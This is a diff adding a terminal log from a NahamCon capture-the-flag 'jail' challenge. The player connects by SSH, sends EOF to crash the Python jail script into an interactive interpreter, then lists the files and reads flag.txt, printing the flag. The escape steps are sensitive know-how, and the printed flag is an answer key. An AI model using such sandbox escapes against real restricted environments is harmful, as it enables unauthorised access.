@@ -1,0 +1,37 @@
+wslubuntu@DevelopmentEnv:~$ ssh -p 32075 user@challenge.nahamcon.com
+The authenticity of host '[challenge.nahamcon.com]:32075 ([34.123.79.100]:32075)' can't be established.
+ECDSA key fingerprint is SHA256:Ui3hn8+316fHz2GZEHtmFc8CzoksXt+b1KjTA9z7fmI.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[challenge.nahamcon.com]:32075,[34.123.79.100]:32075' (ECDSA) to the list of known hosts.
+user@challenge.nahamcon.com's password:
+
+  _________________________
+     ||   ||     ||   ||
+     ||   ||, , ,||   ||
+     ||  (||/|/(\||/  ||
+     ||  ||| _'_`|||  ||
+     ||   || o o ||   ||
+     ||  (||  - `||)  ||
+     ||   ||  =  ||   ||
+     ||   ||\___/||   ||
+     ||___||) , (||___||
+    /||---||-\_/-||---||\
+   / ||--_||_____||_--|| \
+  (_(||)-| SP1337 |-(||)_)
+          --------
+
+Hello prisoner, welcome to jail.
+Don't get any ideas, there is no easy way out!
+: Traceback (most recent call last):
+  File "/home/user/jail.py", line 27, in <module>
+    input(": ")
+EOFError
+>>> import os
+>>> os.listdir()
+['flag.txt', 'jail.py', '.user-entrypoint.sh', '.profile', '.bashrc']
+>>> f = open("flag.txt", "r")
+>>> print(f.read())
+flag{c31e05a24493a202fad0d1a827103642}
+
+>>> Connection to challenge.nahamcon.com closed by remote host.
+Connection to challenge.nahamcon.com closed.
